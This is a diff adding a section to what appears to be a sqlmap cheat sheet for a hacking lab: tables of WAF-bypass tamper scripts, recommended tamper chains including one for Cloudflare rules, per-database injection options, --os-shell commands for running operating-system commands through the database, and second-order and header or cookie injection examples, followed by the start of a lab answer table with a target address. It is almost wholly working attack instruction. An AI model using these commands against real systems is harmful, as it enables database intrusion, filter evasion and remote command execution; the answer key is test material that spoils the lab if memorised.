@@ -146,6 +146,141 @@ sqlmap -u "TARGET" --os-pwn
 
 ---
 
+## Tamper Scripts — Full Reference
+
+`--list-tampers` shows all; below are the most useful by category.
+
+### WAF / character filter bypass
+| Script | What it does |
+|--------|--------------|
+| `between` | `>` → `NOT BETWEEN 0 AND #`; `=` → `BETWEEN # AND #`. Bypass `<`/`>` filters |
+| `equaltolike` | `=` → `LIKE` |
+| `space2comment` | space → `/**/` (MySQL inline comment) |
+| `space2plus` | space → `+` (URL-encoded space) |
+| `space2randomblank` | space → random valid whitespace (tab, newline, etc.) |
+| `space2dash` | space → `-- random\n` (single-line comment + newline) |
+| `space2hash` | space → `# random\n` (MySQL hash comment) |
+| `space2mssqlblank` | space → random whitespace (MSSQL-specific) |
+| `percentage` | `SELECT` → `%S%E%L%E%C%T` (ASP/ASP.NET URL processor strips %) |
+| `apostrophenullencode` | `'` → `%00%27` (null byte prefix) |
+| `apostrophemask` | `'` → `%EF%BC%87` (Unicode fullwidth apostrophe) |
+| `charunicodeencode` | URL-encode non-ASCII to unicode escape |
+| `charencode` | URL-encode all chars (basic obfuscation) |
+
+### Keyword obfuscation
+| Script | What it does |
+|--------|--------------|
+| `randomcase` | `SELECT` → `SeLeCt` |
+| `lowercase` | force lowercase keywords |
+| `uppercase` | force uppercase keywords |
+| `versionedkeywords` | `SELECT` → `/*!SELECT*/` (MySQL versioned comment) |
+| `versionedmorekeywords` | wraps ALL keywords with versioned comments |
+| `halfversionedmorekeywords` | versioned comment before each keyword (MySQL < 5.1) |
+| `modsecurityversioned` | wraps entire query in versioned comment |
+| `modsecurityzeroversioned` | `/*!00000` zero-version variant |
+| `0eunion` | `UNION` → `e0UNION` (numeric type confusion) |
+| `bluecoat` | replaces `AND` → `%26%26`, `=` → ` LIKE ` (Bluecoat WAF) |
+| `concat2concatws` | `CONCAT(a,b)` → `CONCAT_WS(MID(CHAR(0),0,0),a,b)` |
+
+### Backend transformations
+| Script | What it does |
+|--------|--------------|
+| `appendnullbyte` | append `%00` to payload (PHP CGI) |
+| `base64encode` | base64-encode the entire payload |
+| `chardoubleencode` | URL-encode twice (some WAFs decode once) |
+| `commalesslimit` | `LIMIT M,N` → `LIMIT N OFFSET M` (MySQL — comma filter bypass) |
+| `commalessmid` | `MID(x,1,1)` → `MID(x FROM 1 FOR 1)` |
+| `escapequotes` | `\'` and `\"` (escape with backslash) |
+| `ifnull2ifisnull` | `IFNULL(a,b)` → `IF(ISNULL(a),b,a)` |
+| `plus2concat` | `+` → `CONCAT()` (MSSQL) |
+| `plus2fnconcat` | `+` → `{fn CONCAT()}` (ODBC) |
+| `unionalltounion` | `UNION ALL` → `UNION` (smaller request) |
+
+### Common chains
+
+```bash
+# WAF + character filter (most common combo):
+--tamper=between,space2comment,randomcase
+
+# Strict alpha-only filter:
+--tamper=between,equaltolike,space2comment
+
+# ASP.NET URL parser bypass:
+--tamper=percentage,randomcase
+
+# MySQL with versioned comments (some WAFs miss these):
+--tamper=versionedkeywords,space2comment
+
+# Cloudflare default rules:
+--tamper=between,charunicodeencode,space2comment,randomcase
+```
+
+---
+
+## Per-DBMS Quirks
+
+### MySQL
+```bash
+--prefix="`"  --suffix="`-- -"     # backtick column-name context
+--prefix="')) " --suffix="-- -"    # LIKE with double parens
+--tamper=between,space2comment      # most common WAF combo
+--technique=E                       # error-based EXTRACTVALUE/UPDATEXML
+```
+
+### MSSQL
+```bash
+--dbms=mssql --technique=ES         # error + stacked
+--tamper=plus2concat,space2mssqlblank
+--os-shell                          # xp_cmdshell — sqlmap enables it automatically if sysadmin
+```
+
+### PostgreSQL
+```bash
+--dbms=postgresql --technique=ES
+--os-shell                          # COPY FROM PROGRAM — needs superuser
+```
+
+### Oracle
+```bash
+--dbms=oracle --technique=BT        # blind boolean + time (no stacked, no UNION FROM-less)
+--union-from=DUAL                   # required FROM clause
+```
+
+### NoSQL (limited)
+sqlmap doesn't natively handle MongoDB — use `nosqlmap` instead:
+```bash
+git clone https://github.com/codingo/NoSQLMap.git && cd NoSQLMap && python3 nosqlmap.py
+```
+
+---
+
+## Second-Order SQLi
+```bash
+# Stored value triggered by a different URL — sqlmap supports this directly:
+sqlmap -u "http://TARGET/register" --data="user=test*&pass=x" \
+       --second-url="http://TARGET/profile/test"
+# The * marks the injection point in the FIRST URL; --second-url is where the stored value is retrieved
+```
+
+---
+
+## Custom Injection Points
+
+When the parameter is in a non-standard location (HTTP header, complex JSON, etc.):
+
+```bash
+# Mark the injection point with *
+sqlmap -u "http://TARGET/api" --data='{"user":"test*","other":"x"}' -p user
+sqlmap -u "http://TARGET/" --cookie="id=1*; other=x"
+sqlmap -u "http://TARGET/" -H "X-User: test*" --level=5
+sqlmap -r request.txt --batch                       # mark * in the saved request file
+
+# Force a specific testable param (when sqlmap auto-test misses):
+sqlmap -u "http://TARGET/?id=1&other=2" -p id
+```
+
+---
+
 ## Lab Answers — All Cases (Target: `154.57.164.72:30732`)
 
 | Case | Type | Key Flags | Flag Value |
